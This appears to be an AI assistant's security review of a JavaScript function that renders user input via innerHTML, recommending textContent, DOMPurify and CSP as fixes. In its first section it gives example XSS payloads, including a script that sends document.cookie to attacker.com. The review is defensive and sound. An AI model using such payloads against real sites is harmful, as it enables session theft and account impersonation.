## Identified Issues
### 1. Critical Cross-Site Scripting (XSS) Vulnerability
The most severe flaw is using unvalidated user input directly with `innerHTML`:
- **What breaks**: Any malicious HTML/JavaScript embedded in `userInput` will execute in the context of the current page. For example:
  - An attacker could pass `<script>document.location = 'https://attacker.com/steal?c=' + document.cookie</script>` to steal session cookies and impersonate victims.
  - Event handlers like `<img src=x onerror="stealUserSession()">` will also trigger automatically.
  This is a reflected XSS risk if the input is shared via links, or stored XSS if the input is saved publicly (e.g., a comment section).

### 2. Unhandled Runtime Error
If the DOM element with ID `output` does not exist (e.g., on a different page, or if the HTML was modified), `document.getElementById('output')` returns `null`. Attempting to set `null.innerHTML` will throw a `TypeError` that crashes code calling this function.

---

## Suggested Fixes
There are two standard fixes based on your intended use case:

---
### Scenario 1: Render Plain Text Only (Most Common Intended Use)
If you do not need to support raw HTML input (e.g., rendering usernames, plain comments), replace `innerHTML` with `textContent`, which automatically escapes all HTML special characters to prevent XSS:
```javascript
function renderSafeText(userInput) {
  const outputElement = document.getElementById('output');

  // Gracefully handle missing DOM element instead of crashing
  if (!outputElement) {
    console.warn('Failed to find output element with ID "output"');
    return;
  }

  // textContent escapes all HTML, turning tags into plain text
  outputElement.textContent = userInput;
}
```
This is the simplest and safest fix for most use cases.

---
### Scenario 2: Intentionally Render Limited Safe HTML
If you need to support a subset of valid HTML (e.g., basic markdown, formatted text), **never roll your own sanitizer**—use a trusted library like [DOMPurify](https://github.com/cure53/DOMPurify) to safely strip malicious content:
1. Add DOMPurify to your project (via CDN, npm, or package manager):
   ```html
   <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.10/purify.min.js"></script>
   ```
2. Updated secure function:
```javascript
function renderSafeHTML(userInput) {
  const outputElement = document.getElementById('output');

  if (!outputElement) {
    console.warn('Failed to find output element with ID "output"');
    return;
  }

  // Sanitize user input to remove all malicious code
  const sanitizedHTML = DOMPurify.sanitize(userInput);
  outputElement.innerHTML = sanitizedHTML;
}
```

---

## Additional Hardening Best Practices
1.  **Add Input Validation**: Add checks for expected input types/lengths to reject invalid data before rendering:
    ```javascript
    // Example: Limit input to 10,000 characters for text comments
    if (userInput.length > 10000) {
      console.error('Input exceeds maximum allowed length');
      return;
    }
    ```
2.  **Enforce a Content Security Policy (CSP)**: Add CSP headers to your site to block inline scripts and restrict allowed resource loads
